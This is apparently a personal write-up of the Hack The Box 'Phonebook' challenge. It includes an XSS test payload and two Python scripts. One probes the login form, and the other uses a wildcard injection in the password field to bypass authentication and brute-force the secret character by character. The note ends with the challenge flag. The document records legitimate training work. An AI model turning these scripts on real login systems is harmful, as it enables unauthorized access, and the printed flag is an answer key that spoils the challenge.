# Phonebook

XSS  is present

`<img src=x onerror=alert(1) />`

![[Screenshot 2021-03-19 at 8.33.53 PM.png]]

& when testing for sql injection I got something funny:

on passing '/' in the user name & password it gave internal server error
![[Screenshot 2021-03-19 at 8.34.35 PM.png]]

trying for other does not give anything so, this is interesting

lets automate this thing 

```python
import requests

instance = "206.189.121.131:32592"


for i in range(33, 127):
	data = {'username': chr(i), 'password': chr(i)}

	# print(type(data))
	r = requests.post("http://"+instance+"/login",data=data, allow_redirects = True)
	# print(r.content)
	
	print(chr(i) + " -> " + str(r.status_code) + " -> " + r.url)
	
```

![[Screenshot 2021-03-19 at 10.37.16 PM.png]]

Look when the username and pass is `*` it does not gives `Authentication failed`

and we can login
![[Screenshot 2021-03-19 at 10.38.51 PM.png]]

also upon using the username Reese and password: `*` we can login too!

actually we will brute force the password ending with `*`  to get the correct one i.e. flag: HTB{} 
Here if we do not get `Login` in the output of the content of the request i.e. we are going in the right direction! otherwise try another char and keep on brute-forcing!

```python
import re
import requests

instance = "206.189.121.131:32592"

blacklist = {41, 42, 92} # i.e. ) * / cause they give 500 internal server error

password = ""

while True:
	for i in range(33, 127):
		if i not in blacklist:
			tmp_password = password + chr(i) 
			print("trying tmp_password " + tmp_password)
			tmp_password = tmp_password + "*"

			data = {'username': 'Reese', 'password': tmp_password}

			# print(type(data))
			r = requests.post("http://"+instance+"/login",data=data, allow_redirects = True)
			# print(r.content)

			# print(r.text)	
			# print(chr(i) + " -> " + str(r.status_code) + " -> " + r.url)
			if r.status_code != 200:
				print("ERROR")
				exit()

			elif re.search("Login", r.text) == None:
				password = password + chr(i)
				if chr(i) == '}':
					print("Flag == " + password)
					exit()

```


![[Screenshot 2021-03-19 at 11.05.08 PM.png]]

let it run for quite some time!!

![[Screenshot 2021-03-19 at 11.50.28 PM.png]]

got the flag 

HTB{d1rectory_h4xx0r_is_k00l}